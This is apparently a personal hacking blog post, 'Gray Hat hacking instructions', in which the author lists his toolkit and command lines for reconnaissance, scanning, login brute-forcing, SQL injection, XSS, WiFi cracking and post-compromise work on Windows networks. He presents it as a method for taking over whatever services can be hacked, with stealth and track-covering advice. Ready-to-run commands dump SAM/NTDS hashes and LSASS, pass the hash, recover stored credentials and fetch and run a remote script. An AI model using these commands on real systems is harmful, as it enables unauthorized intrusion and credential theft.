[[ PAGE 1 ]]

# Gray Hat hacking instructions

This is going to get messed up. And, in fact, the goal was order.

I recently did some tidying up of my commands and steps for checking a service/pen testing/bounty hunting/hacking/red taming/messing around. I decided to write it down in one place and expand it as needed. Here is my list of steps and tools I use when hacking. Mainly what I have used recently. Sometimes I update the toolkit because some become obsolete and are not developed anymore and new tools appear in their place. Another reason is that I like to have a list of steps to follow. Hacking is a complex process and sometimes it gets chaotic, so it’s worth sticking to some sort of guide so I don’t accidentally forget anything. There is no single golden rule or instruction on how to hack everything. The general approach may have some outline, but everything changes depending on what you find. It is also worth keeping an eye out for new applications and scripts, because sometimes you can add something to your own toolkit to speed up or automate a step, well, unless fame and glory are involved.

Here are some websites where you can find some new tools:

- [KaliLinuxTutorials](https://kalilinuxtutorials.com/)
- [KitPloit](https://www.kitploit.com/)

Well, you see, I’m not a CVE-publishing, zero-day-finding, new-vulnerability-discovering hacker, i.e. I might be able to do it, but it would probably take me a very long time and the reward would be inadequate to the discovery. And because I am lazy, greedy, and believe that fame is a restriction of freedom, I hack like a racist script kiddie.

My hacking is about finding low-hanging fruit and exploiting the mistakes of the man on the other side.

Well, in a way that’s what hacking is all about, I have the knowledge of what it should look like and the person who has the service also knows it or doesn’t know it. So they have knowledge or they don’t have knowledge or they have gaps in their knowledge. And these security holes or lack of proper configuration makes the weakness of the service available. So it’s a kind of knowledge race. Either someone will use the knowledge to have a secure service or I will use it to take over.

A bit of a messy description, but it works, at least for me. The more I train, the more vulnerabilities I discover, the more vulnerabilities I discover, the more services I take over.

And it’s not like in the movies, where you order a hack and it gets everywhere. A well secured place is not hackable. End of story (or I’m not there yet). The only thing you can do with a well-secured place is to break its owner, a human being. Then we have access to the place in the same way as he does.

I don’t hack people though, I leave the social engineering tricks to myself to make my life easier, to get people to do what I want or to agree with me when they normally wouldn’t. I enjoy manipulating people more.

So I hack what can be hacked, not what should be hacked or what I want to be hacked.

A short break for a fancy AI-generated image - a must have in today’s world on every hacker blog - for this article. The internet is now flooded with this kind of AI generated graphics, so I follow the trends and put this shit here too. Have fun.

![gray hat hacking instruction](gray_hat_hacking_instructions.jpg)

It is funny how AI thinks hackerspace looks and how real hackerspace actually looks.

![real hacker room](hacker_room.jpg)

Back to hacking. In general it’s a hard and long process, running the tools, analyzing the results, understanding the results, drawing conclusions, restarting the tools, re-analyzing and many hours in between while the tools are running to spit out more results for analysis. Analyzing and reviewing tons of data and then checking whether potentially detected vulnerabilities are real and exploitable, only to find out in the end that they are not.

And then maybe those few clicks to take over the database or service. Or finding the point at which all known options have been sorted, all leads closed and the attack in question abandoned. Moving on to a list of targets and selecting the next one to repeat hours or days of analysis. To perhaps find nothing again. Sometimes something works a couple of times a month, sometimes a couple of times a week, sometimes a marathon failure occurs and nothing is found for months.

It’s not as exciting as in the movies.

So on paper the steps look more or less like this and sometimes they are nowhere near the practice. But you have to start somewhere.

1. Reconnaissance/Footprinting
2. Scanning
3. Gaining access
4. Maintaining Access
5. Clearing tracks

There are dozens of pages describing these steps and the theories behind them. You’re sure to find some. Below are my tools that are more or less assigned to these steps, I focus more on reconnaissance and scanning and based on the findings get access and maintain it or just get what I want and sometimes clean up to make it harder to identify me, but in most cases even if you leave a mess and you had a good OPSec no one will find you. As I mainly check web applications and my targets are mainly databases or other vulnerabilities that can be reported in the bug bounty, not everything is always covered. Oh, and don’t forget that I’m a senior script kiddie.

Check back from time to time to see what new tools I have added and what I have removed.

The list below only has basic command examples, you should always spend some time tweaking the parameters. Especially those related to threads and timing, throttling, aggression level and others related to being less noisy. Don’t forget to add some API’s to the tools configs to get better results.

## Environment

I do everything on Kali Linux on a dedicated physical and virtual machine. On the physical I leave the tasks that take more time, it is my main machine that runs 24h (when I am hacking, otherwise it is turned off). On the virtual, I test and launch custom tools and tasks that I can do quickly.

Additionally, when testing and hacking, the system is connected to a VPN hosted on my VPS + sometimes I use [PIA VPN](https://www.privateinternetaccess.com/pages/buy-a-vpn/1218buyavpn?invite=U2FsdGVkX19oYLgcJdf5ifx3BndnRuyii5a276hQdRU,joP9abqfL4tGtEVitvXC93OjAOE) + sometimes I use Tor as a socks proxy for traffic, e.g. when hacking hidden services on the onion domain.

To sum things up:

- [Kali Linux OS](https://www.kali.org/)
- VPN (personal + VPS and [Private Internet Access VPN](https://www.privateinternetaccess.com/pages/buy-a-vpn/1218buyavpn?invite=U2FsdGVkX19oYLgcJdf5ifx3BndnRuyii5a276hQdRU,joP9abqfL4tGtEVitvXC93OjAOE))
- Dell OptiPlex Micro 7050 (i5-6500T, 8GB 128 SSD), I’ll add more RAM and SDD one day, for now it’s enough.
- Virtual machine running Kali Linux on [VirtualBox](https://www.virtualbox.org/). Sometimes I use [virt-manager](https://virt-manager.org/) to provision temporary systems.
- VPS, the one with the VPN configured, I also use sometimes to run some basic tools.

For some Python tools downloaded from GitHub, I also install them as a virtual environment, as sometimes system dependencies are not met. Here are steps how to create `venv`, activate it, install dependencies in it and deactivate.

```bash
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
deactivate
```

But there is even simpler method using [virtualenvwrapper](https://virtualenvwrapper.readthedocs.io/en/latest/)

```bash
# install virtualenvwrapper
pip install virtualenvwrapper
# set it up
export WORKON_HOME=~/Envs 
mkdir -p $WORKON_HOME
source /usr/local/bin/virtualenvwrapper.sh
# create virtual environment
mkvirtualenv env1
# list venv home
ls $WORKON_HOME
# activate venv
workon env1
# enter venv catalog
cd $WORKON_HOME
```

## Footprinting

Footprinting is just gathering general information about the target, it is the first step in the reconnaissance process. Passive gathering (DNS, public records, WHOIS, social media) and active gathering, i.e. interacting with the system (ping, network mapping, banner grabbing). All to understand what the system looks like and how it works. It is advisable to distinguish between reconnaissance and scanning as much as possible, so that the reconnaissance itself does not burn your operation.

- **WHOIS Lookup**: To get domain registration information.
- **Nslookup/Dig**: For DNS information.
- **Traceroute**: To determine the path to a destination.
- **Google Dorking**: Use specific search queries to find information that is not easily accessible.
- **Internet of everything**: Shodan, ZoomEye, Censys, GreyNoise.
- **Waf**: A web application hidden by a web application firewall.
- **NMAP**: Basic scans.

Information’s gathered thanks to this task:

- Domain names, IP addresses, and network blocks.
- Network architecture information.
- Employee details, email addresses, and contact information.
- Operating systems and software versions in use.
- Security policies and configurations.

### WHOIS

System tools:

```bash
whois example.com
```

Online tools:

- [DomainTools](https://whois.domaintools.com/)
- [MXToolBox](https://mxtoolbox.com/SuperTool.aspx)

### DNS

System tools:

```bash
nslookup example.com
nslookup -type=mx example.com
dig example.com mx
dig example.com any
```

[Dnsrecon](https://github.com/darkoperator/dnsrecon), for automated scans

```bash
dnsrecon -d example.com -t std --xml dnsrecon.xml
```

`-d example.com`: domain

`-t std`: standard scan

`–xml dnsrecon.xml`: save the output to a file

Online tools:

- [DNSChecker](https://dnschecker.org/all-dns-records-of-domain.php)
- [DNSDumpster](https://dnsdumpster.com/)

### Traceroute

```bash
tracert example.com
```

### Google Dorks

[Fast Google Dorks Scan](https://github.com/IvanGlinkin/Fast-Google-Dorks-Scan) for automated dork scan. Installed in `/opt` from GitHub.

```bash
cd /opt/Fast-Google-Dorks-Scan
chmod +x FGDS.sh
FGDS.sh example.com
```

[Pagodo](https://github.com/opsdisk/pagodo) automate Google Hacking Database scraping and searching. Installed in `/opt` from GitHub as Python virtual environment.

```bash
cd /opt/pagodo
python3 -m venv .venv
source .venv/bin/activate
python ghdb_scraper.py -s -j -i # Write all dorks to all_google_dorks.txt, all_google_dorks.json
python pagodo.py -d example.com -g dorks/all_google_dorks.txt -i 5 -x 15 -s results.txt
```

`-i` - Specify the **minimum** delay between dork searches, in seconds. Don’t make this too small, or your IP will get HTTP 429’d quickly.

`-x` - Specify the **maximum** delay between dork searches, in seconds. Don’t make this too big or the searches will take a long time.

Performing 7300+ search requests to Google as fast as possible will simply not work. One solution is to use a bank of HTTP(S)/SOCKS proxies and pass them to `pagodo`.

Online tools:

- [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)

### Internet of everything

Search for IP, cert, domain, ports and anything else related to the service that has been indexed on the Internet.

- [Shodan](https://www.shodan.io/)
- [ZoomEye](https://www.zoomeye.ai/)
- [GreyNoise](https://viz.greynoise.io/)
- [CenSys](https://search.censys.io/)

### Recon AIO

There are also cool all-in-one tools, I use [FinalRecon](https://github.com/thewhiteh4t/FinalRecon). To check headers, sslinfo, whois, crawl, dns, subdomains, traceroute, base director and ports.

```bash
finalrecon --full --url https://example.com
```

It is worth adding API keys for better results:

```bash
$HOME/.config/finalrecon/keys.json
```

[Amass](https://github.com/owasp-amass/amass) is network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.

```bash
amass enum -d example.com
```

again, it is worth configuring different API’s for better results. The config file is here `$HOME/.config/amass/config.ini`.

[reconftw](https://github.com/six2dez/reconftw) - tool designed to perform automated recon on a target domain by running the best set of tools to perform scanning and finding out vulnerabilities.

Run a scan (full + resume)

```plaintext
./reconftw.sh -d example.com -r
```

`-r` - Recon: Full reconnaissance without active attacks  
`-s` - Subdomains: Subdomain enumeration, web probing, and takeovers  
`-p` - Passive: Passive reconnaissance only  
`-a` - All: Full reconnaissance plus active vulnerability checks  
`-w` - Web: Vulnerability checks on specific web targets

[rengine](https://github.com/yogeshojha/rengine) - reNgine is your ultimate web application reconnaissance suite, designed to supercharge the recon process for security pros, pentesters, and bug bounty hunters.

My recommendation is to install it on clean Ubuntu server with docker.

### WAF check

[wafw00f](https://github.com/EnableSecurity/wafw00f) to test if the application is hidden by the web application firewall.

```bash
wafw00f https://example.org
```

### Namp

```bash
nmap -sS -T2 -sV --randomize-hosts -D RND:10 example.com
```

`-sS`: SYN scan (half-open), which is less intrusive.

`-T2`: Sets the scanning speed to “polite,” which reduces the risk of detection by IDS/IPS.

`-sV`: Service version detection on open ports.

`--randomize-hosts`: Randomizes the order of hosts to scan.

`-D RND:10`: Decoy scan to obscure the actual source of the scan.

You can use other scan types like:

`-sA`: TCP-ACK Scanning, check if ports are filtered, more can be found [here](../../../../2021/12/21/nmap/index.html).

### gowitness

Website screenshot utility written in Golang, that uses Chrome Headless to generate screenshots of web interfaces using the command line, with a handy report viewer to process results.

```bash
gowitness scan single --url "https://sensepost.com" --write-db
```

- screenshot a single website `gowitness single https://www.google.com/`
- screenshot a cidr using 20 threads `gowitness scan --cidr 192.168.0.0/24 --threads 20`
- screenshot open http services from an namp file `gowitness nmap -f nmap.xml --open --service-contains http`
- run the report server `gowitness report server`

### OSINT

To collect some details about users, emails, nicknames.

[iKy](https://kennbroorg.gitlab.io/ikyweb/) is a tool that collects information from an email and shows results in a nice visual interface.

[Profil3r](https://github.com/amitrajputfff/Profil3r) is an OSINT tool that allows you to find potential profiles of a person on social networks, as well as their email addresses. Installed in `/opt` from GitHub as Python virtual environment.

```bash
cd /opt/Profil3r
python3 -m venv .venv
source .venv/bin/activate
python3 profil3r.py -p john doe
```

Online tools:

[OSINT Framework](https://osintframework.com/) + [Polish alternative](https://osintframework.pl/)

## Scanning and enumeration

Depending on the result of the reconnaissance, e.g. CMS detected, services running, I run other scanners, mainly vulnerability scanners, port scanners or an all-in-one tool to collect as many attack vectors as possible. To find live hosts and interact with them. Just to get more details about specific ports, running services and software versions. After scanning, I also do enumeration to extract detailed and specific information from identified services. It is all about extracting users, network shares, web server locations, configurations etc.

### ZAP

In this step, when I touch web application, I also run [ZAP](https://www.zaproxy.org/). To crawl the website and run passive and active scans. You can also run Burp for this.

### NMAP

```bash
nmap -sV -sC -O -T4 -oA scan <IP> #Fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -p - -oA fullfastscan <IP> #Fast scan for all the ports
nmap -sV -sC -O -p - -oA fullscan <IP> #Scan every tcp port to know exactly what is running in that machine
nmap -sV -sC -T  #Check if any of the 1000 most common udp ports are running
```

`-sC`: default scripts  
`-sV`: service version  
`-O:` operating system  
`-oA`: output filename  
`-T4`: aggressive fast scan

And I also use [vulscan](https://github.com/scipag/vulscan) (Advanced vulnerability scanning with Nmap NSE).

```bash
nmap -sS -sV --script=vulscan example.com
```

### General vulnerability scanners

[Nikto](https://github.com/sullo/nikto) is a web server vulnerability scanner.

```bash
nikto -host http://example.com/ -o /results.html
```

[Wapiti](https://github.com/wapiti-scanner/wapiti) is web vulnerability scanner written in Python3.

```bash
wapiti -u http://example.com/
```

### Skipfish

[Skipfish](https://www.kali.org/tools/skipfish/)? Someone may ask why, this tool is old and has not been developed for 10 years or more. However, I find it useful for old technology sites.

```bash
skipfish -o output_directory -S /path/to/dictionary example.com
```

### Wapiti

Web vulnerability scanner written in Python3. [Wapiti](https://github.com/wapiti-scanner/wapiti) works as a “black-box” vulnerability scanner, that means it won’t study the source code of web applications but will work like a fuzzer, scanning the pages of the deployed web application, extracting links and forms and attacking the scripts, sending payloads and looking for error messages, special strings or abnormal behaviors.

```bash
wapiti -u http://example.com/
```

### Other scanners and tests

[SSLScan](https://github.com/rbsec/sslscan) tests SSL/TLS-enabled services to determine supported cipher suites.

```bash
sslscan example.com
```

[ShellShockHunter](https://github.com/MrCl0wnLab/ShellShockHunter) it’s a simple tool for testing the shellshock vulnerability.

```bash
python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl
```

[Bbot](https://github.com/blacklanternsecurity/bbot) a recursive internet scanner for hackers.

```bash
# Port-scan every subdomain, screenshot every webpage, output to current directory
bbot -t example.com -f subdomain-enum -m nmap gowitness -n my_scan -o .
# A basic web scan includes wappalyzer, robots.txt, and other non-intrusive web modules
bbot -t example.com -f subdomain-enum web-basic
# Crawl www.evilcorp.com up to a max depth of 2, automatically extracting emails, secrets, etc.
bbot -t www.example.com -m httpx robots badsecrets secretsdb -c web_spider_distance=2 web_spider_depth=2
# Subdomains, emails, cloud buckets, port scan, basic web, web screenshots, nuclei
bbot -t example.com -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly
```

[Webcopilot](https://github.com/h4r5h1t/webcopilot) an automation tool that enumerates subdomains then filters out xss, sqli, open redirect, lfi, ssrf and rce parameters and then scans for vulnerabilities.

```bash
webcopilot -d http://example.com/ -a -b <backend_URL>
```

as a backend I use [Burp collaborator](https://portswigger.net/burp/documentation/collaborator) or [InteractSH](https://app.interactsh.com/).

### CMS Scanners

For scanning specific CMS. Installed in `/opt` from GitHub.

[Vulnx](https://github.com/anouarbensaad/vulnx) an intelligent Bot, Shell can achieve automatic injection, and help researchers detect security vulnerabilities CMS system.

```bash
vulnx -u http://example.com/ -w -d --dns -o /test
```

`-u`: url target

`-w`: web information gathering

`-d`: subdomains information gathering

`--dns`: dns information gathering

`-e` for exploiting

[CMSeeK](https://github.com/Tuhinshubhra/CMSeeK) CMS Detection and Exploitation suite - Scan WordPress, Joomla, Drupal and over 180 other CMSs. Installed in `/opt` from GitHub.

```bash
python3 cmseek.py -u https://example.com
```

[WPScan](https://github.com/wpscanteam/wpscan) WordPress security scanner.

```bash
wpscan --url http://example.com/ -e -U -o /wpscan --api-token=WordPress Vulnerability Database API
```

`--url`: domain url

`-e`: enumeration

`-U`: users list

`-o`: output to FILE

`--api-token`: [WordPress Vulnerability Database API](https://wpscan.com/api)

[WpCrack](https://github.com/22XploiterCrew-Team/WpCrack) is an audit and brute force tool used to remotely test WordPress blogging software. Installed in `/opt` from GitHub.

```bash
python WpCrack.py -t http://exmaple.com/wp-login.php -u admin --p wordlist.txt
```

[Joomscan](https://github.com/OWASP/joomscan) Joomla vulnerability scanner.

```bash
joomscan -u http://example.com/
```

[juumla](https://github.com/oppsec/juumla) is a python tool created to identify Joomla version, scan for vulnerabilities and sensitive files. Installed in `/opt` from GitHub.

```bash
python3 main.py -u https://example.com
```

[OKadminFinder](https://github.com/mIcHyAmRaNe/okadminfinder) admin/login panel finder. Installed in `/opt` from GitHub.

```bash
okadminfinder -u example.com -r
```

### Subdomains

Build a list of subdomains to expand the scope of the attack, or take them over if possible.

[Subfinder](https://github.com/projectdiscovery/subfinder) fast passive subdomain enumeration tool

```bash
subfinder -d example.com -v -all -o subdomains.txt
```

It is worth to configure [API’s](https://docs.projectdiscovery.io/tools/subfinder/install#post-install-configuration) for better results.

[Knock](https://github.com/guelfoweb/knock) Subdomain Scan. Installed in `/opt` from GitHub.

```bash
knockpy -d example.com --recon --bruteforce --save report
knockpy --report example.com_yyyy_aa_dd_hh_mm_ss.json #show report
```

[Bbot](https://github.com/blacklanternsecurity/bbot) a recursive internet scanner for hackers. Installed in `/opt` from GitHub.

```bash
bbot -t example.com -f subdomain-enum
# Perform a passive-only subdomain enumeration on evilcorp.com
bbot -t example.com -f subdomain-enum -rf passive
```

[dnsReaper](https://github.com/punk-security/dnsReaper) subdomain takeover tool for attackers. Installed in `/opt` from GitHub as Python virtual environment.

```bash
python main.py --domain example.com
```

[Subzy](https://github.com/PentestPad/subzy) subdomain takeover vulnerability checker. Generate manually list from Subfinder or Bbot and add it as targets in Subzy.

```bash
./subzy run --targets subdomains.txt
```

You may also be interested in one of my previous articles on the [subdomain takeover task](../../../../2020/08/05/subdomain-takeover/index.html).

### Fuzzing and bruteforcing

For any tool related to wordlists I use [SecLists](https://github.com/danielmiessler/SecLists), [fuzzdb](https://github.com/fuzzdb-project/fuzzdb), [Combined-Wordlists](https://github.com/0xspade/Combined-Wordlists) and [web-fuzz-wordlists](https://github.com/kaimi-io/web-fuzz-wordlists). Most of the things described below can also be done in ZAP using the same wordlists.

[Ffuf](https://github.com/ffuf/ffuf) - fast web fuzzer written in Go, mostly for directory or files discovery.

```bash
ffuf -w /path/to/wordlist -u https://example.com/FUZZ
ffuf -w /path/to/vhost/wordlist -u https://example.com -H "Host: FUZZ" -fs 4242
ffuf -w /path/to/paramnames.txt -u https://example.com/script.php?FUZZ=test_value -fs 4242
```

I use [Crunch](https://github.com/jim3ma/crunch), [CeWL](https://github.com/digininja/CeWL), [bopscrk](https://github.com/r3nt0n/bopscrk) and [web-wordlist-generator](https://github.com/OsmanKandemir/web-wordlist-generator) as Python virtual environment) to generate my custom wordlist.

```bash
crunch 3 3 0123456789ABCDEF -o passwords.txt
or
cewl -d 2 -m 5 -w passwords.txt http://example.com --with-numbers
or
cewl -d 0 -m 5 -w usernames.txt http://example.com/team.php --lowercase
```

and then, for example, bruteforce the credentials:

```bash
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://target.com/login.php -d "username=FUZZ&password=FUZ2Z"
```

of course I also use [thc-hydra](https://github.com/vanhauser-thc/thc-hydra) like everyone else for bruteforcing.

```bash
hydra -L passwords.txt -P 3digits.txt -f -v http://example.com/ http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
hydra -L user.txt -P pass.txt IP_Address smb
```

[Feroxbuster](https://github.com/epi052/feroxbuster) a fast, simple, recursive content discovery tool written in Rust. It is also great alternative to the one already mentioned for forced browsing.

```bash
./feroxbuster -u http://example.com -x pdf -x js,html -x php txt json,docx -s 200 301 302 --random-agent
```

[Dirsearch](https://github.com/maurosoria/dirsearch) is cool web path scanner.

```bash
python3 dirsearch.py -u https://example.com
python3 dirsearch.py -e php,html,js -u https://example.com
python3 dirsearch.py -e php,html,js -u https://example.com -w /path/to/wordlist
```

[Gobuster](https://github.com/OJ/gobuster) last but not least, a directory/file, DNS and VHost busting tool written in Go.

```bash
gobuster dns -d example.com -t 50 -w common-names.txt
gobuster dir -u https://example.com/path/to/folder -c 'session=123456' -t 50 -w common-files.txt -x .php,.html
gobuster fuzz -u https://example.com?FUZZ=test -w parameter-names.txt
```

[cook](https://github.com/glitchedgitz/cook) is a wordlist framework that allows you to do whatever you want with your wordlists :) It is so complicated that you should read all about it in the official repo.

[DirDar](https://github.com/M4DM0e/DirDar) is a tool that searches for (403-forbidden) directories to break them and get dir listing on them, worth mentioning.

Interesting for bruteforce web login is [web-brutator](https://github.com/koutto/web-brutator). Old, but works. Installed in `/opt` from GitHub.

[Shreder](https://github.com/EntySec/Shreder) is a powerful multi-threaded SSH protocol password brute-force tool.

```bash
shreder 192.168.1.100 -u username -l passwords.txt
```

[Legba](https://github.com/evilsocket/legba) a multiprotocol credentials bruteforcer/password sprayer and enumerator. Cool alternative to thc-hydra.

### SQLi

For SQL injection, it is worth getting a list of URLs with parameters, e.g. from ZAP/Burp or another crawler.

[DSSS](https://github.com/stamparm/DSSS) Damn Small SQLi Scanner. Installed in `/opt` from GitHub.

```bash
python3 dsss.py -u "http://example.com/index.php?parameter=1"
```

[SQLMap](https://github.com/sqlmapproject/sqlmap) automatic SQL injection and database takeover tool.

```bash
python3 sqlmap.py -u "https://example.com/index.php?id=1" --batch --banner
python3 sqlmap.py -u "https://example.com/index.php?id=1" -f --banner --dbs --users
python3 sqlmap.py -m list.txt --batch --banner
```

You can also crawl using SQLMap:

```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```

[jSQL Injection](https://github.com/ron190/jsql-injection) is a Java application for automatic SQL database injection. GUI tool. Downloaded to `/opt` from GitHub.

```bash
java -jar jsql-injection-v0.101.jar
```

[sqlscan](https://github.com/Cvar1984/sqlscan) - is quick web scanner for find an sql inject point.

```bash
sqlscan http://example.com --scan
```

[paramspider](https://github.com/devanshbatham/ParamSpider) - mining URLs from dark corners of Web Archives for bug hunting/fuzzing/further probing.

You can use ZAP/Burp to get URL with params, also copy the requests to use injection in POST requests, but paramspider is also a cool tool to extract only valuable URLs.

```bash
paramspider -d example.com
paramspider -l domains.txt
```

[Arjun](https://github.com/s0md3v/Arjun) - HTTP parameter discovery suite.

```bash
arjun -u https://api.example.com/endpoint
```

### XSS

These tools are no longer actively developed, but they work fine. The XSS vulnerability is so old and still detectable, and literally nothing is changing on the security or attack side, that these tools are still useful. Besides, ZAP or Burp detect the same thing.

[Dalfox](https://github.com/hahwul/dalfox) is a powerful open-source XSS scanner and utility focused on automation.

```bash
dalfox url http://example.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff -b https://your-callback-url
dalfox file urls_file --custom-payload ./mypayloads.txt
```

[XSStrike](https://github.com/s0md3v/XSStrike) most advanced XSS scanner. Installed in `/opt` from GitHub.

```bash
python xsstrike.py -u "http://example.com/search.php?q=query"
python xsstrike.py -u "http://example.com/page.php" --crawl
```

[Traxss](https://github.com/M4cs/traxss) - automated XSS Vulnerability Scanner. Installed in `/opt` from GitHub as Python virtual environment.

```bash
python3 traxss.py
```

[XSpear](https://github.com/hahwul/XSpear) powerfull XSS Scanning and Parameter analysis tool&gem.

```bash
xspear -u "http://example.com/listproducts.php?cat=123" -v 0
```

[PwnXSS](https://github.com/pwn0sec/PwnXSS) vulnerability (XSS) scanner exploit. Installed in `/opt` from GitHub.

```bash
python3 pwnxss.py -u http://example.com
```

### SMTP

When searching for open relays.

[xSMTP](https://github.com/azizz98/xSMTP) lightning fast, multithreaded smtp scanner targeting open-relay and unsecured servers in multiple network ranges. Installed in `/opt` from GitHub.

```bash
python3 xsmtp.py
> 1
Enter a website url:
> exmaple.com
```

### WiFi cracking

Because sometimes you have to hack somewhere to be able to hack.

[WEF](https://github.com/D3Ext/WEF) Wi-Fi Exploitation Framework. Installed in `/opt` from GitHub.

```bash
sudo wef -i wlan0
```

[Bettercap](https://github.com/bettercap/bettercap) the Swiss Army knife for 802.11, BLE, IPv4 and IPv6 networks reconnaissance and MITM attacks. It is a GUI tool.

```bash
sudo bettercap -caplet http-ui
```

Default credentials are here `/usr/local/share/bettercap/caplets/http-ui.cap`

[H4rpy](https://github.com/MS-WEB-BN/h4rpy) automated WPA/WPA2 PSK attack tool.

```bash
sudo ./h4rpy
```

[Airgorah](https://github.com/martin-olivier/airgorah) a WiFi security auditing software mainly based on aircrack-ng tools suite. It is a GUI app, just run it from the menu.

Also check out [WiFiBroot](https://github.com/hash3liZer/WiFiBroot).

### Compromised machine

When I am inside, I use some of these tools to get more information about the environment and the machine itself. To hack more!

[Linux smart enumeration](https://github.com/diego-treitos/linux-smart-enumeration) in case if I am looking for possibilities in the OS.

```bash
wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
./lse.sh
```

Other for Linux and Windows is [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) and [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).

[LaZagne](https://github.com/AlessandroZ/LaZagne) credentials recovery.

```bash
laZagne.exe all
```

[Seatbelt](https://github.com/GhostPack/Seatbelt) performs a number of security oriented host-survey “safety checks” relevant from both offensive and defensive security perspectives.

```bash
Seatbelt.exe -group=all -full
```

[linWinPwn](https://github.com/lefayjey/linWinPwn) is a bash script that streamlines the use of a number of Active Directory tools.

```bash
./linWinPwn.sh -t <Domain_Controller_IP> --auto [-o <output_dir>]
```

[Impacket](https://github.com/fortra/impacket) is a collection of Python classes for working with network protocols.

```bash
impacket-secretsdump $domain/$user:$pass@$ip
```

[HiveNightmare](https://github.com/GossiTheDog/HiveNightmare) exploit allowing you to read registry hives as non-admin on Windows 10 and 11.

```bash
# Get SAM, SECURITY and SYSTEM hive dumps
.\HiveNightmare.exe
# Download those 3 files to your machine and dump the hashes:
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
# Log in to the remote system using the Pass The Hash technique:
impacket-psexec -hashes $hash $user@$ip
```

[PingCastle](https://www.pingcastle.com/) is AD configuration and vulnerabilities scanner.

### SMB

Because the files are everywhere and unsecured.

[NetExec](https://github.com/Pennyw0rth/NetExec) (formerly [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)) is a must if I am in a Windows network.

```bash
nxc smb IP -u '' -p '' && cme smb IP -u'a' -p ''
nxc smb IP -u 'user' -p 'pass' --local-auth --sam
nxc smb IP -u user -H 'hash' --local-auth -X 'whoami'
nxc smb IP -u user -p 'pass' -d DOMAIN --lsa
nxc smb IP -u user -p 'pass' -d DOMAIN --sam
nxc smb IP -u user -p 'pass' -d DOMAIN --sam -M lsassy
nxc smb IP -u user -p 'pass' --ntds
nxc smb IP -u user -p 'pass' --ntds vss
nxc smb IP -u user -p 'pass' -M wireless
nxc smb IP -u user -p 'pass' -M handlekatz
nxc smb IP -u user -p 'pass' -M nanodump
nxc smb IP -u user -p 'pass' -M procdump
nxc smb IP -u user -p 'pass' --laps
nxc smb IP -u user -p 'pass' -M gpp_password
```

[Snaffler](https://github.com/SnaffCon/Snaffler) a tool for pentesters to help find delicious candy. Ehh, interesting files on SMB shares.

```bash
snaffler.exe -s -o snaffler.log
Snaffler.exe -s -i C:\
```

Nmap, good old tool at every step.

```bash
nmap -iL list_of_IPs.txt -sV -O -p139,445 -T3 -PN
nmap -iL list_of_445.txt -p139,445 -T3 -PN --script smb-vuln*
```

[Smbmap](https://github.com/ShawnDEvans/smbmap) is a handy SMB enumeration tool.

```bash
./smbmap.py -u "" -p "" -P 445 --host-file list_of_targets.txt -g /output_anonymous.txt
./smbmap.py -u "guest" -p "" -P 445 --host-file list_of_targets.txt -g /output_guest.txt
./smbmap.py -H 192.168.0.200 -u Administrator -p asdf1234   
```

[SMBeagle](https://github.com/punk-security/SMBeagle) fileshare auditing tool.

```bash
./SMBeagle.exe -c out.csv -f
```

[PowerHuntShares](https://github.com/NetSPI/PowerHuntShares) is an audit script designed in inventory, analyze, and report excessive privileges configured on Active Directory domains.

### Mobile

Sometimes a basic analysis of the mobile app can find APIs or passwords.

[Apkleaks](https://github.com/dwisiswant0/apkleaks) for scanning APK file for URIs, endpoints & secrets.

```bash
apkleaks -f ~/path/to/file.apk
```

[Apk2url](https://github.com/n0mi1k/apk2url) an OSINT tool to quickly extract IP and URL endpoints from APKs by disassembling and decompiling.

```bash
./apk2url.sh /path/to/apk/file.apk
```

### GitHub

To find interesting stuff on GitHub.

[Trufflehog](https://github.com/trufflesecurity/trufflehog) - find and verify secrets.

```bash
trufflehog git https://github.com/trufflesecurity/test_keys --only-verified
trufflehog github --org=trufflesecurity --only-verified
trufflehog #for the wizzard
```

[Octosuite](https://github.com/bellingcat/octosuite) - GitHub Data Analysis Framework.

[Legitify](https://github.com/Legit-Labs/legitify) - detect and remediate misconfigurations and security risks across all your GitHub and GitLab assets.

[gitleaks](https://github.com/gitleaks/gitleaks) - Find secrets with Gitleaks.

[Secret Magpie](https://github.com/punk-security/secret-magpie) secret Detection Tool.

```bash
python main.py <github/gitlab/azuredevops> --org 'github organisation name' --pat 'personal access token'
```

[DotGit](https://github.com/davtur19/DotGit) - An extension for checking if .git is exposed in visited websites.

### API

[Apidetector](https://github.com/brinhosa/apidetector) efficiently scan for exposed Swagger endpoints across web domains and subdomains. Supports HTTP/HTTPS, multi-threading, and flexible input/output options. Ideal for API security testing.

```bash
python apidetector.py -i list_of_company_subdomains.txt -o results_file.txt -t 30 -ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
```

### LFI

[Lfi-Space](https://github.com/capture0x/Lfi-Space) to detect Local File Inclusion. Installed in `/opt` from GitHub as Python virtual environment.

```bash
python3 lfi.py
```

### OpenRedirect

[OpenRedireX](https://github.com/devanshbatham/OpenRedireX) - A fuzzer for detecting open redirect vulnerabilities.

```bash
openredirex [-p payloads] [-k keyword] [-c concurrency]
```

### PCAP

[NetworkAssessment](https://github.com/HalilDeniz/NetworkAssessment) is designed to analyze pcap files to detect potential suspicious network traffic.

[TrafficWatch](https://github.com/HalilDeniz/TrafficWatch) a packet sniffer tool, allows you to monitor and analyze network traffic from PCAP files.

